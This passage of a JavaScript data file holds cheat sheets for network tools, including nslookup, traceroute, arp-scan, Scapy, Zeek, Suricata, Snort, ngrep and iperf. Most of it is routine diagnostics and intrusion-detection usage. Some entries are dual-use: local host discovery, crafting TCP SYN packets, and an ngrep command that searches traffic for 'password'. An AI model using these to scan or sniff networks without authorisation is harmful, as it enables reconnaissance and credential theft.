        ]
      },
      {
        title: "Command Line",
        content: [
          { type: 'code', value: 'nslookup google.com', label: 'Basic Query' },
          { type: 'code', value: 'nslookup -type=mx google.com', label: 'MX Record Query' },
          { type: 'code', value: 'nslookup -type=ns google.com', label: 'NS Record Query' },
          { type: 'code', value: 'nslookup google.com 8.8.8.8', label: 'Query Specific Server' },
        ]
      }
    ]
  },
  whois: {
    title: "whois Cheat Sheet",
    description: "Protocol for querying databases for domain registration info.",
    sections: [
      {
        title: "Basic Usage",
        content: [
          { type: 'code', value: 'whois google.com', label: 'Domain Query' },
          { type: 'code', value: 'whois 8.8.8.8', label: 'IP Query' },
        ]
      },
      {
        title: "Options",
        content: [
          { type: 'code', value: 'whois -h [server] google.com', label: 'Specify WHOIS Server' },
          { type: 'code', value: 'whois -H', label: 'Hide Legal Disclaimers (on some clients)' },
        ]
      }
    ]
  },
  traceroute: {
    title: "traceroute Cheat Sheet",
    description: "Diagnostic tool for displaying the route packets take to network host.",
    sections: [
      {
        title: "Basic Usage",
        content: [
          { type: 'code', value: 'traceroute google.com', label: 'Trace Path' },
          { type: 'code', value: 'traceroute -n google.com', label: 'No DNS Resolution (Faster)' },
        ]
      },
      {
        title: "Advanced Options",
        content: [
          { type: 'code', value: 'traceroute -I google.com', label: 'Use ICMP (Like Windows tracert)' },
          { type: 'code', value: 'traceroute -T google.com', label: 'Use TCP SYN' },
          { type: 'code', value: 'traceroute -p 80 google.com', label: 'Set Port' },
          { type: 'code', value: 'traceroute -m 20 google.com', label: 'Max Hops' },
          { type: 'code', value: 'traceroute -w 1 google.com', label: 'Wait Time (Seconds)' },
        ]
      }
    ]
  },
  "arp-scan": {
    title: "arp-scan Cheat Sheet",
    description: "Scanner for discovering hosts on the local network via ARP.",
    sections: [
      {
        title: "Discovery",
        content: [
          { type: 'code', value: 'arp-scan --localnet', label: 'Scan Local Network' },
          { type: 'code', value: 'arp-scan -I eth0 --localnet', label: 'Scan Interface' },
        ]
      },
      {
        title: "Input/Output",
        content: [
          { type: 'code', value: 'arp-scan --file=hostlist.txt', label: 'Scan IPs from File' },
          { type: 'code', value: 'arp-scan --localnet --retry=3', label: 'Set Retries' },
        ]
      }
    ]
  },
  "angry-ip-scanner": {
    title: "Angry IP Scanner Cheat Sheet",
    description: "Fast and friendly network scanner.",
    sections: [
      {
        title: "Usage Notes",
        content: [
          { type: 'text', value: "Angry IP Scanner is primarily a GUI tool. There is no complex CLI command set, but here are usage tips:" },
          { type: 'note', value: "Use 'Preferences' > 'Display' to choose which columns (Hostname, Ports, TTL) to show." },
          { type: 'note', value: "Add 'Fetchers' to gather specific data like NetBIOS info or Mac Vendors." },
        ]
      },
      {
        title: "Shortcuts",
        content: [
          {
            type: 'table',
            headers: ['Action', 'Shortcut'],
            rows: [
              ['Start Scan', 'Ctrl + S'],
              ['Stop Scan', 'Ctrl + X'],
              ['Export Selection', 'Ctrl + E'],
              ['Open Preferences', 'Ctrl + P']
            ]
          }
        ]
      }
    ]
  },
  etherape: {
    title: "EtherApe Cheat Sheet",
    description: "Graphical network monitoring modeled after Etherman.",
    sections: [
      {
        title: "CLI Options",
        content: [
          { type: 'text', value: "While graphical, EtherApe can be launched with options." },
          { type: 'code', value: 'etherape -i eth0', label: 'Select Interface' },
          { type: 'code', value: 'etherape -r capture.pcap', label: 'Replay Pcap File' },
          { type: 'code', value: 'etherape -f "ip.addr == 192.168.1.1"', label: 'Set Capture Filter' },
        ]
      },
      {
        title: "GUI Usage",
        content: [
          { type: 'text', value: "Nodes represent hosts. Link thickness represents traffic volume." },
          { type: 'text', value: "Colors typically represent protocols (Red=TCP, Blue=UDP, etc)." },
        ]
      }
    ]
  },
  scapy: {
    title: "Scapy Cheat Sheet",
    description: "Python-based interactive packet manipulation program.",
    sections: [
      {
        title: "Interactive Mode",
        content: [
          { type: 'code', value: 'scapy', label: 'Enter Shell' },
          { type: 'code', value: 'ls()', label: 'List Protocols' },
          { type: 'code', value: 'lsc()', label: 'List Commands' },
          { type: 'code', value: 'conf', label: 'Show Config' },
        ]
      },
      {
        title: "Packet Crafting",
        content: [
          { type: 'code', value: 'pkt = IP(dst="8.8.8.8")/ICMP()', label: 'Create ICMP Packet' },
          { type: 'code', value: 'pkt = IP(dst="10.0.0.1")/TCP(dport=80, flags="S")', label: 'Create TCP SYN' },
          { type: 'code', value: 'pkt.show()', label: 'Display Packet Details' },
        ]
      },
      {
        title: "Sending & Receiving",
        content: [
          { type: 'code', value: 'send(pkt)', label: 'Send Layer 3' },
          { type: 'code', value: 'sendp(pkt)', label: 'Send Layer 2' },
          { type: 'code', value: 'sr(pkt)', label: 'Send & Receive (Layer 3)' },
          { type: 'code', value: 'sr1(pkt)', label: 'Send & Receive 1 Response' },
          { type: 'code', value: 'sniff(count=10)', label: 'Sniff Packets' },
        ]
      }
    ]
  },
  zeek: {
    title: "Zeek (Bro) Cheat Sheet",
    description: "Network security monitor and analysis framework.",
    sections: [
      {
        title: "Running Zeek",
        content: [
          { type: 'code', value: 'zeek -i eth0', label: 'Monitor Interface' },
          { type: 'code', value: 'zeek -r capture.pcap', label: 'Analyze Pcap' },
          { type: 'code', value: 'zeek -C -r capture.pcap', label: 'Ignore Checksums' },
        ]
      },
      {
        title: "Log Files",
        content: [
          { type: 'text', value: "Zeek generates tab-separated logs in the current directory." },
          {
            type: 'table',
            headers: ['Log File', 'Content'],
            rows: [
              ['conn.log', 'TCP/UDP/ICMP Connections'],
              ['http.log', 'HTTP Requests/Replies'],
              ['dns.log', 'DNS Activity'],
              ['files.log', 'File Analysis'],
              ['ssl.log', 'SSL/TLS Handshakes'],
            ]
          }
        ]
      },
      {
        title: "Zeek-Cut",
        content: [
          { type: 'text', value: "Parse columns from logs easily." },
          { type: 'code', value: 'cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p', label: 'Extract Source/Dest/Port' },
        ]
      }
    ]
  },
  suricata: {
    title: "Suricata Cheat Sheet",
    description: "High performance Network IDS, IPS and NSM engine.",
    sections: [
      {
        title: "Execution",
        content: [
          { type: 'code', value: 'suricata -i eth0', label: 'Run on Interface' },
          { type: 'code', value: 'suricata -r capture.pcap', label: 'Run on Pcap' },
          { type: 'code', value: 'suricata -T', label: 'Test Configuration' },
          { type: 'code', value: 'suricata -c /etc/suricata/suricata.yaml -i eth0', label: 'Run with Config' },
        ]
      },
      {
        title: "Logs",
        content: [
          { type: 'text', value: "Default location: `/var/log/suricata/`" },
          { type: 'text', value: "`fast.log`: Quick alerts. `eve.json`: Detailed JSON output." },
        ]
      }
    ]
  },
  snort: {
    title: "Snort Cheat Sheet",
    description: "Open Source Intrusion Detection System.",
    sections: [
      {
        title: "Modes",
        content: [
          { type: 'code', value: 'snort -v', label: 'Sniffer Mode (Verbose)' },
          { type: 'code', value: 'snort -vd', label: 'Packet Logger Mode' },
          { type: 'code', value: 'snort -A console -c /etc/snort/snort.conf -i eth0', label: 'NIDS Mode (Console Alert)' },
        ]
      },
      {
        title: "Rule Syntax",
        content: [
          { type: 'text', value: "Format: `[action] [proto] [src_ip] [src_port] -> [dst_ip] [dst_port] ([options])`" },
          { type: 'code', value: 'alert tcp any any -> 192.168.1.0/24 80 (msg:"Web Traffic"; sid:1000001;)', label: 'Example Rule' },
        ]
      },
      {
        title: "Testing Rules",
        content: [
          { type: 'code', value: 'snort -T -c /etc/snort/snort.conf', label: 'Test Config Validity' },
        ]
      }
    ]
  },
  ngrep: {
    title: "ngrep Cheat Sheet",
    description: "Grep for network traffic.",
    sections: [
      {
        title: "Basic Usage",
        content: [
          { type: 'code', value: 'ngrep "password" port 80', label: 'Search "password" on Port 80' },
          { type: 'code', value: 'ngrep -q "User-Agent" tcp port 80', label: 'Quiet Search for Header' },
        ]
      },
      {
        title: "Display Options",
        content: [
          { type: 'code', value: 'ngrep -W byline "GET" port 80', label: 'Readable Line Breaks' },
          { type: 'code', value: 'ngrep -x "pattern"', label: 'Hex Dump' },
        ]
      },
      {
        title: "Input/Output",
        content: [
          { type: 'code', value: 'ngrep -I capture.pcap "pattern"', label: 'Search in Pcap' },
          { type: 'code', value: 'ngrep -O output.pcap "pattern"', label: 'Save Matches to Pcap' },
        ]
      }
    ]
  },
  iperf: {
    title: "iperf Cheat Sheet",
    description: "Tool for active measurements of the maximum achievable bandwidth on IP networks.",
    sections: [
      {
        title: "Server Mode",
        content: [
          { type: 'code', value: 'iperf -s', label: 'Start Server (TCP)' },
          { type: 'code', value: 'iperf -s -u', label: 'Start Server (UDP)' },
        ]
      },
      {
        title: "Client Mode",
        content: [
          { type: 'code', value: 'iperf -c [server_ip]', label: 'Run Client' },
          { type: 'code', value: 'iperf -c [server_ip] -t 60', label: 'Run for 60 Seconds' },
          { type: 'code', value: 'iperf -c [server_ip] -P 4', label: '4 Parallel Threads' },
          { type: 'code', value: 'iperf -c [server_ip] -u -b 10M', label: 'UDP Test 10Mbps' },
          { type: 'code', value: 'iperf -c [server_ip] -R', label: 'Reverse Mode (Server sends to Client)' },
        ]
      }
    ]
  }
};
